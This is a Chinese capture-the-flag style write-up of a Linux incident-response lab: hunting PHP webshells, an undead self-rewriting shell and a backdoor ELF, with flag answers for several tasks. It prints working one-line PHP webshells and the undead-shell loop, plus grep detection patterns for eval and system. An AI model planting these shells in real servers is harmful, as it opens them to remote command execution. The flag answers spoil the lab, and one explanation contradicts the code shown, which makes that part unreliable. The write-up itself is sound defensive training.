[!NOTE] 本文涉及玄机（Chaitin）应急响应靶场系列第一章《Linux 入侵排查》的完整解题思路。所有操作在官方授权靶场内进行，仅用于应急响应技能训练。

一、靶场简介

玄机 是长亭科技推出的国内知名应急响应实训平台，覆盖 Linux / Windows 入侵排查、日志分析、流量分析、权限维持等真实蓝队场景。

第一章 —— Linux 入侵排查

安全工程师小王某人收到安全设备告警：某 Linux 服务器被植入恶意文件，请上机排查。

序号任务描述提交内容
1Web 目录存在木马，找到木马的密码flag{密码}
2服务器疑似存在不死马，找到不死马的密码flag{密码}
3不死马是通过哪个文件生成的flag{文件名}
4黑客留下了木马文件，找出黑客服务器 IPflag{IP}
5黑客服务器开启的监听端口flag{端口}

上机第一步永远是 摸清环境：

# 查看服务进程

发现 Apache 正在监听 80 端口，说明这是一台 PHP Web 服务器。Web 目录常规位置在 /var/www/html，进去一探究竟。

1

ls -la /var/www/html/

常见的 WebShell 文件特征名值得警觉：1.php、shell.php、index.php 中藏后门等。

三、逐题拆解

Flag 1｜WebShell 查杀

方法一：手工 grep 高危函数

在 Linux 上没有 D盾、河马这类 Windows 端自动化工具时，手工 grep 是最直接的方法：

1
2
3

find /var/www/html -name "*.php" | xargs grep -l "eval(" 2>/dev/null
find /var/www/html -name "*.php" | xargs grep -l "assert(" 2>/dev/null
find /var/www/html -name "*.php" | xargs grep -l "system\|exec\|passthru\|shell_exec" 2>/dev/null

方法二：上传到 Windows 用 D盾 扫描（现场常用）

应急现场中如果允许，可以把整个 Web 目录打包下载到本地，用 D盾 / 河马 WEBSHELL 查杀工具跑一遍，基本能扫出所有隐藏的 Shell：

1
2
3
4

# 在服务器上打包
tar czf web_backup.tar.gz /var/www/html/

# 在本地下载后用 D盾 扫描

分析木马文件

定位到可疑文件 1.php，直接查看源码：

1

cat /var/www/html/1.php

1

<?php @eval($_POST['1']); ?>

这是最经典的 一句话木马，POST 参数名即为密码。

[!TIP] 常见一句话木马变形：

  • <?php @assert($_POST['pass']); ?>
  • <?php eval($_POST['cmd']); ?>
  • <?php system($_GET['c']); ?>

Flag 1：flag{1}

Flag 2 & 3｜不死马（内存马）排查

“不死马” 指被删除后会自动重新生成的 WebShell，通常依赖 文件写入 + 计划任务 / 进程守护。

定位不死马文件

继续用 grep 扫描，发现 .shell.php —— 文件名以点开头，属于隐藏文件：

1

ls -la /var/www/html/

1
2
3
4
5
6
7
8
9

# .shell.php 的大致结构
<?php
ignore_user_abort(true);
set_time_limit(0);
$file = 'index.php';
while(true) {
    file_put_contents($file, '<?php @eval($_POST["' . md5('hello') . '"]); ?>');
    usleep(3000);  // 每 3 毫秒重写一次
}

关键发现：

  1. 不死马文件本身被 index.php 持续重写 —— 所以删掉 .shell.php 没用
  2. 密码是 MD5(hello) —— 需要解出 MD5 值
1
2

echo -n "hello" | md5sum
# 5d41402abc4b2a76b9719d911017c592

Flag 2：flag{5d41402abc4b2a76b9719d911017c592} Flag 3：flag{index.php}

应急处置建议

遇到不死马时，正确的清除顺序：

  1. 先 kill 掉守护进程（ps aux | grep php 找可疑进程）
  2. 再 删除生成文件（index.php 或 .htaccess 里的恶意代码）
  3. 最后 删除不死马本身（.shell.php）
  4. 重启 Web 服务

Flag 4 & 5｜木马程序分析（外联 IP + 端口）

Web 目录下还有一个可疑文件 shell.elf —— 典型的 Linux 木马 / 后门程序。

[!WARNING] 切勿直接在生产机上执行未知二进制！ 正确做法是：拷贝到隔离沙箱或本机分析。

本题是授权靶场环境，可以临时执行观察行为。

1
2
3
4
5
6

# 查看文件类型
file /var/www/html/shell.elf
# ELF 64-bit LSB executable

# 查看字符串特征（推荐先做这步）
strings /var/www/html/shell.elf | grep -i "127.0.0.1\|192.\|port\|listen\|connect"

执行木马（靶场环境可控），然后开另一个 SSH 会话抓网络连接：

1
2
3
4
5
6
7

# 会话 A：执行木马
chmod +x shell.elf && ./shell.elf

# 会话 B：查看网络连接
netstat -atnlp
# 或
ss -antp

从网络连接表里找到外联的 目标 IP 和 监听端口。

# ============ 进程排查 ============
ps auxf                    # 树状进程，看异常进程
ps -ef | grep -v grep | grep php
ls -l /proc/<PID>/exe      # 进程对应可执行文件路径
ls -l /proc/<PID>/cwd      # 进程当前工作目录

# ============ 网络排查 ============
netstat -tnlp / ss -tnlp   # 监听端口和对应进程
netstat -antp              # 所有网络连接（含外联）
lsof -i                    # 更直观的端口占用

# ============ 文件排查 ============
find / -name ".*" -type f -newer /etc/passwd  # 可疑隐藏文件
find /var/www -name "*.php" -newer /etc/passwd  # 近期修改的 PHP 文件
find / -perm -4000 -type f 2>/dev/null          # SUID 提权文件
ls -la /tmp /var/tmp /dev/shm                   # 临时目录检查

# ============ 计划任务 ============
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/

# ============ 登录日志 ============
last -a                              # 历史登录记录
lastb                                # 失败登录尝试
cat /var/log/auth.log                # 认证日志（Debian）
cat /var/log/secure                  # 认证日志（CentOS）

五、小结

本章考察的是应急响应中最基础也最核心的几项技能：

能力对应 Flag
WebShell 识别（grep / 自动化工具）Flag 1
不死马 / 内存马排查（文件写入 + 进程守护）Flag 2 & 3
恶意二进制静态 + 动态分析Flag 4 & 5

[!IMPORTANT] 真实应急场景中，绝不要直接执行未知二进制文件。务必通过静态分析（strings、反汇编）、沙箱运行或专业工具（Cuckoo、VirusTotal）来获取信息。
